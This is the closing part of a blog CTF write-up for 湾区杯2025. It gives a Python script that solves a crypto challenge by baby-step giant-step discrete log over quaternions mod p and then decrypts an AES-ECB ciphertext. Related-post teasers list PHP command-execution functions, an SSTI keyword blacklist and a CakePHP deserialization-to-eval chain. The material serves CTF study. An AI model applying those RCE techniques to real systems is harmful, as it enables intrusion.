other</span>):</span><br><span class="line">        a1, b1, c1, d1 = <span class="variable language_">self</span>.a, <span class="variable language_">self</span>.b, <span class="variable language_">self</span>.c, <span class="variable language_">self</span>.d</span><br><span class="line">        a2, b2, c2, d2 = other.a, other.b, other.c, other.d</span><br><span class="line">        a_new = (a1 * a2 - b1 * b2 - c1 * c2 - d1 * d2) % <span class="variable language_">self</span>.p</span><br><span class="line">        b_new = (a1 * b2 + b1 * a2 + c1 * d2 - d1 * c2) % <span class="variable language_">self</span>.p</span><br><span class="line">        c_new = (a1 * c2 - b1 * d2 + c1 * a2 + d1 * b2) % <span class="variable language_">self</span>.p</span><br><span class="line">        d_new = (a1 * d2 + b1 * c2 - c1 * b2 + d1 * a2) % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">return</span> Quaternion(a_new, b_new, c_new, d_new, <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">conjugate</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> Quaternion(<span class="variable language_">self</span>.a, -<span class="variable language_">self</span>.b, -<span class="variable language_">self</span>.c, -<span class="variable language_">self</span>.d, <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">norm</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.a * <span class="variable language_">self</span>.a + <span class="variable language_">self</span>.b * <span class="variable language_">self</span>.b + <span class="variable language_">self</span>.c * <span class="variable language_">self</span>.c + <span class="variable language_">self</span>.d * <span class="variable language_">self</span>.d) % <span class="variable language_">self</span>.p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">self</span>):</span><br><span class="line">        n = <span class="variable language_">self</span>.norm()</span><br><span class="line">        <span class="keyword">if</span> n % <span class="variable language_">self</span>.p == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ZeroDivisionError(<span class="string">&quot;Quaternion not invertible (norm == 0 mod p)&quot;</span>)</span><br><span class="line">        invn = <span class="built_in">pow</span>(n, -<span class="number">1</span>, <span class="variable language_">self</span>.p)  <span class="comment"># Python 3.8+ modular inverse</span></span><br><span class="line">        c = <span class="variable language_">self</span>.conjugate()</span><br><span class="line">        <span class="keyword">return</span> Quaternion(c.a * invn, c.b * invn, c.c * invn, c.d * invn, <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power_quat</span>(<span class="params">base, exp</span>):</span><br><span class="line">    res = Quaternion(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    b = base</span><br><span class="line">    e = exp</span><br><span class="line">    <span class="keyword">while</span> e &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> e &amp; <span class="number">1</span>:</span><br><span class="line">            res = res * b</span><br><span class="line">        b = b * b</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">Q = Quaternion(*Q_components)</span><br><span class="line">R = Quaternion(<span class="number">53580504271939954579696282638160058429308301927753139543147605882574336327145</span>,</span><br><span class="line">               <span class="number">79991318245209837622945719467562796951137605212294979976479199793453962090891</span>,</span><br><span class="line">               <span class="number">53126869889181040587037210462276116096032594677560145306269148156034757160128</span>,</span><br><span class="line">               <span class="number">97368024230306399859522783292246509699830254294649668434604971213496467857155</span>)</span><br><span class="line">limit = <span class="number">2</span>**<span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bsgs_quaternion</span>(<span class="params">Q, R, limit</span>):</span><br><span class="line">    m = ceil(isqrt(limit))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] BSGS parameters: limit=<span class="subst">&#123;limit&#125;</span>, m=<span class="subst">&#123;m&#125;</span> (需要大约 <span class="subst">&#123;m&#125;</span> 存储项)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># baby steps: store Q^j for j in [0, m-1]</span></span><br><span class="line">    baby = <span class="built_in">dict</span>()</span><br><span class="line">    cur = Quaternion(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> cur <span class="keyword">not</span> <span class="keyword">in</span> baby:</span><br><span class="line">            baby[cur] = j</span><br><span class="line">        cur = cur * Q</span><br><span class="line">        <span class="keyword">if</span> (j+<span class="number">1</span>) % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  baby progress: j=<span class="subst">&#123;j+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># factor = Q^&#123;-m&#125;</span></span><br><span class="line">    Qm = power_quat(Q, m)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        factor = Qm.inv()</span><br><span class="line">    <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Q^m not invertible; BSGS 失败&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># giant steps: check R*(Q^&#123;-m&#125;)^i</span></span><br><span class="line">    cur = R</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> cur <span class="keyword">in</span> baby:</span><br><span class="line">            j = baby[cur]</span><br><span class="line">            x = i * m + j</span><br><span class="line">            <span class="keyword">if</span> x &lt; limit:</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line">        cur = cur * factor</span><br><span class="line">        <span class="keyword">if</span> (i+<span class="number">1</span>) % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  giant progress: i=<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Q =&quot;</span>, Q)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] R =&quot;</span>, R)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] limit (exclusive) =&quot;</span>, limit)</span><br><span class="line">    x = bsgs_quaternion(Q, R, limit)</span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到 secret（可能超出 limit 或内存不足）&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 找到 secret =&quot;</span>, x)</span><br><span class="line">    key = md5(<span class="built_in">str</span>(x).encode()).hexdigest().encode()</span><br><span class="line">    cipher = AES.new(key=key, mode=AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pt = unpad(cipher.decrypt(ciphertext), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="built_in">print</span>(cipher.decrypt(ciphertext))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(pt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ArcNova7.github.io">ArcNova</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://arcnova7.github.io/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/">https://arcnova7.github.io/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="https://imgslim.geekpark.net/uploads/image/file/2b/d3/2bd37f20466d5d1cbf0928c27697b205.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/08/XCTF2025/" title="XCTF2025"><img class="cover" src="https://adworld.xctf.org.cn/media/news_cover/70000635-d985-45d7-9682-3c71c1fb6928.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">XCTF2025</div></div><div class="info-2"><div class="info-item-1">XCTF2025go-storage || XXX || SOLVED题目描述 People say golang is secure, so I’m rewriting legacy code to golang for my data storage service. The title environment is 173.32.X.210:80, where X is the team ID  题目分析 上传点的“模板扩展名保持”机制  Go 的 os.CreateTemp(dir, pattern)把第二个参数当“模板”。如果模板中包含 *，Go 会用一段随机字符串替换 *。关键是：模板中 * 后面的扩展名会被保留。   静态文件服务仅按扩展名设置响应类型，.html 会被浏览器当 HTML 渲染执行。  getContentType 通过文件名后缀判别 MIME，.html 返回 text&#x2F;html。  服务端不做内容魔数检测、不设置 nosniff，浏览器会当 HTML 解析执行。这样上传的 HTML 能作为“同源页面”运行任意 JS。   1234567...</div></div></div></a><a class="pagination-related" href="/2025/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">命令执行(RCE)绕过技术</div></div><div class="info-2"><div class="info-item-1">命令执行(RCE)绕过技术全面指南参考https://blog.csdn.net/qq\_43431158/article/details/105422347，写到异或绕过 1.  基础概念RCE (Remote Code Execution)：远程代码执行漏洞，攻击者可直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 2. 常见执行函数2.1 PHP代码执行函数eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()等。 2.2 PHP命令执行函数system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()等。 passthru(&#39;tac fla*&#39;); 2.3 特殊函数利用 反引号执行：`ls` 或 &lt;?= ls ?&gt;（短标签形式）  无参数函数调用：PHP ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/08/28/JAVA%E5%8F%8D%E5%B0%84/" title="深入理解Java反射机制：动态操作类的强大工具"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/2853232508930053.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-28</div><div class="info-item-2">深入理解Java反射机制：动态操作类的强大工具</div></div><div class="info-2"><div class="info-item-1">深入理解Java反射机制：动态操作类的强大工具什么是反射？Java反射是一种强大的机制，允许程序在运行时动态获取类的信息并对其进行操作。通过反射，我们可以在编译时不需要知道具体类的情况下，运行时获取类的字段、方法、构造函数等信息，并能够动态调用方法、创建实例和访问字段。这种能力使得Java程序具备了更高的灵活性和动态性。 反射的核心类Java反射机制主要由以下几个位于java.lang.reflect包中的核心类组成：  Class类：表示类或接口，是反射操作的入口点 Field类：表示类的字段（成员变量） Method类：表示类的方法 Constructor类：表示类的构造函数  反射实战：通过示例学习让我们通过一个具体的例子来理解反射的各个操作环节： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import java.lang.reflect.*;public class ReflectionExample &#123;    public...</div></div></div></a><a class="pagination-related" href="/2025/07/19/LZCTF2025/" title="LZCTF2025"><img class="cover" src="/2025/07/19/LZCTF2025/PixPin_2025-07-19_12-22-54.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-19</div><div class="info-item-2">LZCTF2025</div></div><div class="info-2"><div class="info-item-1">WEBXX二把嗦 :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126from flask import Flask, request, render_template_stringimport htmlapp = Flask(__name__)BLACKLIST = [    &#x27;init&#x27;,&#x27;globals&#x27;,&#x27;builtins&#x27;,&#x27;import&#x27;,&#x27;os&#x27;,&#x27;popen&#x27;,&#...</div></div></div></a><a class="pagination-related" href="/2025/09/01/LACTF_2025_arclbroth/" title="LACTF_2025_arclbroth"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1758516606541.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-01</div><div class="info-item-2">LACTF_2025_arclbroth</div></div><div class="info-2"><div class="info-item-1">LACTF_2025_arclbrotharclbroth | CLOSED | working :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145// 导入所需的模块const crypto = require(&#x27;crypto&#x27;);const path = require(&#x27;path&#x27;);const express = require(&#x2...</div></div></div></a><a class="pagination-related" href="/2025/12/08/hello-world/" title="Hello World"><img class="cover" src="https://img.shetu66.com/2023/08/03/1691035301699647.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment 相册教程https://blog.csdn.net/weixin_45509582/article/det...</div></div></div></a><a class="pagination-related" href="/2025/12/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" title="命令执行(RCE)绕过技术"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/1757651700281.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">命令执行(RCE)绕过技术</div></div><div class="info-2"><div class="info-item-1">命令执行(RCE)绕过技术全面指南参考https://blog.csdn.net/qq\_43431158/article/details/105422347，写到异或绕过 1.  基础概念RCE (Remote Code Execution)：远程代码执行漏洞，攻击者可直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 2. 常见执行函数2.1 PHP代码执行函数eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()等。 2.2 PHP命令执行函数system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()等。 passthru(&#39;tac fla*&#39;); 2.3 特殊函数利用 反引号执行：`ls` 或 &lt;?= ls ?&gt;（短标签形式）  无参数函数调用：PHP ...</div></div></div></a><a class="pagination-related" href="/2025/12/08/SUCTF/" title="SUCTF"><img class="cover" src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/263e5fe7c7bc4d83879090fd5082e7a9.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">SUCTF</div></div><div class="info-2"><div class="info-item-1">SUCTF_CakePHP 5.1.4 反序列化攻击链详细分析攻击链概览1234567891011RejectedPromise::__destruct()     ↓Response::__toString()     ↓Table::__call()     ↓BehaviorRegistry::call()     ↓MockClass::generate()     ↓eval() - RCE    详细分析每个环节1. 入口点 - 反序列化触发位置: src/PagesController.php:79 123456public function handleSer()&#123;    $ser = $this-&gt;request-&gt;getQuery(&#x27;ser&#x27;);    unserialize(base64_decode($ser));  // 直接反序列化用户输入    // ...&#125;    攻击方式: GET /ser?ser=&lt;base64_encoded_payload&gt; 关键点:  没有任何输入验证  直...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ArcNova</div><div class="author-info-description">「ArcNova」的网络安全研习录</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/S3ekit"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ArcNova7" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:123456@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B9%BE%E5%8C%BA%E6%9D%AF2025"><span class="toc-number">1.</span> <span class="toc-text">湾区杯2025</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI"><span class="toc-number">2.0.1.</span> <span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eazy-readfile"><span class="toc-number">2.0.2.</span> <span class="toc-text">eazy_readfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eazy-python"><span class="toc-number">2.0.3.</span> <span class="toc-text">eazy_python</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#new-trick"><span class="toc-number">3.0.1.</span> <span class="toc-text">new_trick</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/CSS%20INJECTION%20STUDY/" title="CSS INJECTION"><img src="https://i-blog.csdnimg.cn/blog_migrate/e2e0bc2a26be6207654bc427135a86ca.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSS INJECTION"/></a><div class="content"><a class="title" href="/2026/01/25/CSS%20INJECTION%20STUDY/" title="CSS INJECTION">CSS INJECTION</a><time datetime="2026-01-25T02:23:39.000Z" title="Created 2026-01-25 10:23:39">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/CSharp_Code_Audit/" title="C# Code_Audit"><img src="https://pic2.zhimg.com/v2-ada7a981b5da4f94af145470bce124b5_720w.jpg?source=172ae18b" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C# Code_Audit"/></a><div class="content"><a class="title" href="/2026/01/25/CSharp_Code_Audit/" title="C# Code_Audit">C# Code_Audit</a><time datetime="2026-01-25T02:23:39.000Z" title="Created 2026-01-25 10:23:39">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/vSphere%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/" title="vSphere 网络技术原理"><img src="https://www.abackup.com/enterprise-backup/image6540/others/vmware-vsphere-backup.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vSphere 网络技术原理"/></a><div class="content"><a class="title" href="/2026/01/25/vSphere%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/" title="vSphere 网络技术原理">vSphere 网络技术原理</a><time datetime="2026-01-25T02:23:39.000Z" title="Created 2026-01-25 10:23:39">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/25/%E5%B8%B8%E8%A7%81CSP%E9%85%8D%E7%BD%AE%E8%A6%81%E7%82%B9%E4%B8%8E%E5%8F%AF%E7%94%A8%E7%BB%95%E8%BF%87/" title="常见 CSP 配置要点与可用绕过"><img src="https://i-blog.csdnimg.cn/blog_migrate/d11b1f00505190db9c986ab2c0b50429.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常见 CSP 配置要点与可用绕过"/></a><div class="content"><a class="title" href="/2026/01/25/%E5%B8%B8%E8%A7%81CSP%E9%85%8D%E7%BD%AE%E8%A6%81%E7%82%B9%E4%B8%8E%E5%8F%AF%E7%94%A8%E7%BB%95%E8%BF%87/" title="常见 CSP 配置要点与可用绕过">常见 CSP 配置要点与可用绕过</a><time datetime="2026-01-25T02:23:39.000Z" title="Created 2026-01-25 10:23:39">2026-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/" title="湾区杯2025"><img src="https://imgslim.geekpark.net/uploads/image/file/2b/d3/2bd37f20466d5d1cbf0928c27697b205.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="湾区杯2025"/></a><div class="content"><a class="title" href="/2025/12/08/%E6%B9%BE%E5%8C%BA%E6%9D%AF/" title="湾区杯2025">湾区杯2025</a><time datetime="2025-12-08T15:49:36.000Z" title="Created 2025-12-08 23:49:36">2025-12-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By ArcNova</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>